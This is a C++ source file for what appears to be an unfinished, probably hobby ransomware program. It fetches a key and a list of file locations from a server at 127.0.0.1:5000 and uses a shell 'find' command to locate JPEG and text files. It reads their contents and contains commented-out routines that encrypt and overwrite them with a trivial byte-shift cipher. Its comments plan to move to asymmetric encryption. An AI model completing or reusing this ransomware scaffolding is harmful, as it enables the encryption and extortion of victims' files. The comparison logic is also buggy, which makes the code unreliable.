#include <string>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include "ransomMethods.h"



int main(){  
	std::vector<std::string> fileLocationsVector;
	std::vector<std::vector<std::string>> fileContentVector;
	std::string serverStoredLocationsRaw = get_request("http://127.0.0.1:5000/locations");
	std::string secretKey = get_request("http://127.0.0.1:5000/secretKey");

	system("find . -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.


	// TODO - Create function that compares fileLocationsVector with serverStoredLocationsRaw and removes already stored locations.

	



	if(getFileContents("fileLocations", fileLocationsVector)){ // Read file locations into a string vector.			
		for(std::string& location : fileLocationsVector){
			std::vector<std::string> temporaryVector;
			if(getFileContents(location, temporaryVector)){	   // Read contens of each location into its own into its own string vector.
				fileContentVector.push_back(temporaryVector);
				temporaryVector.clear();		
			}			
		}
    }
    
    std::vector<std::string> serverLocationsVector = hackyMessJsonSanitizer(serverStoredLocationsRaw);
    std::vector<std::string> locationsToBeEncrypted;

    for(int i = 0; i < fileLocationsVector.size(); i++){
    	for(int j = 0; j < serverLocationsVector.size(); j++){
    		if(fileLocationsVector[i].compare(serverLocationsVector[j]) != 0){
    			std::cout << "fileLocationsVector[i]: " << fileLocationsVector[i] << std::endl;
    			std::cout << "serverLocationsVector[j]: " << serverLocationsVector[j] << std::endl;
    			locationsToBeEncrypted.push_back(fileLocationsVector[i]);
    		}
    	}
    }

    if(locationsToBeEncrypted.size() > 0 ){
 		   	std::cout<< "some there";

    }
    else{
    	std::cout << "none";
    }
    
    post_request("ddddddddddddsdsdsdddddddddd");










	/*	// ENCRYPT - Basic encryption. Just increments by one. Will change for asymmetric encryption.
	for(vector<std::string>& file: fileContentVector){
		for(string& line : file){
			basicEncryptContent(line);
		}
	}*/


	/*	// UPDATE FILES - after the contents of the files have been encrypted. Replace contents of file with encrypted content.
	// Move to function
	ofstream myFile;
	for(int i = 0; i < fileContentVector.size(); i++){  //loop through vector<vectors>(3)
		myFile.open(fileLocationsVector[i]);
		for(int j = 0; j < fileContentVector[i].size(); j++){ //loop through contents of files line by line.
			myFile << fileContentVector[i][j] << '\n';
			
		}
		myFile.close();			
	}*/	



	/*	// DECRYPT - Basic encryption. Just decrements by one. Will change for asymmetric decryption.
	for(vector<std::string>& file: fileContentVector){
		for(string& line : file){
			basicDecryptContent(line);
		}
	}*/    
	

	/*	// UPDATE FILES - after the contents of the files have been decrypted. Replace contents of file with encrypted content.
	// Move to function
	ofstream myFile;
	for(int i = 0; i < fileContentVector.size(); i++){  //loop through vector<vectors>(3)
		myFile.open(fileLocationsVector[i]);
		for(int j = 0; j < fileContentVector[i].size(); j++){ //loop through contents of files line by line.
			myFile << fileContentVector[i][j] << '\n';
			
		}
		myFile.close();			
	}*/	

	
    return 0;
}
